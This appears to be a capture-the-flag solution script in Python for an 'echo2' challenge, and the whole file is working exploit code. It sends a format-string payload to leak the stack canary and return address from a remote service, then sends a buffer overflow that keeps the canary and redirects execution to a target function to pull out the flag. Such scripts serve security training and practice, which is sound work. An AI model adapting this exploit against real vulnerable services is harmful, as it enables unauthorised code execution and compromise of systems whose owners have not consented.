import socket
import pprint
import sys

REG_ARGS = 6 - 1 # 6 regs used for calling args (minus the format string arg to printf)
LEAKY_STRING = b"%p" * (64 + REG_ARGS)  # 64 * 8 = 512 bytes of stack to read

ORIG_RET_ADDRESS = 0x15b5
TARGET_ADDRESS = 0x1229

CANARY_OFFSET = 33
RET_OFFSET = 35


def hack_the_planet(host: str, port: int):
    """Solve the echo2 challenge."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(1)

    # Step 1: Leak
    s.send(LEAKY_STRING + b"\n")
    data = s.recv(4096)

    # Convert (nil) to 0x0
    data = data.replace(b"(nil)", b"0x0")
    values = data.split(b"0x")[1 + REG_ARGS:] # First is empty

    # Print out the read stack for debugging
    pprint.pprint([{num: value} for num, value in enumerate(values)], width=32)

    canary = int(values[CANARY_OFFSET].decode(), 16)
    ret = int(values[RET_OFFSET].decode(), 16)

    ret -= ORIG_RET_ADDRESS
    ret += TARGET_ADDRESS

    canary_bin = int.to_bytes(canary, 8, "little", signed=False)
    ret_bin = int.to_bytes(ret, 8, "little", signed=False)

    data = b"a" * (8 * CANARY_OFFSET)
    data += canary_bin
    data += b"\x00" * 8
    data += ret_bin

    # Step 2: Exploit
    s.send(data + b"\n")

    # Recieve multiple chunks
    result = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        result += chunk

    # Find the flag
    offset = result.find(b"flag{")
    return result[offset:]


if __name__ == "__main__":
    print(hack_the_planet(sys.argv[1], int(sys.argv[2])))
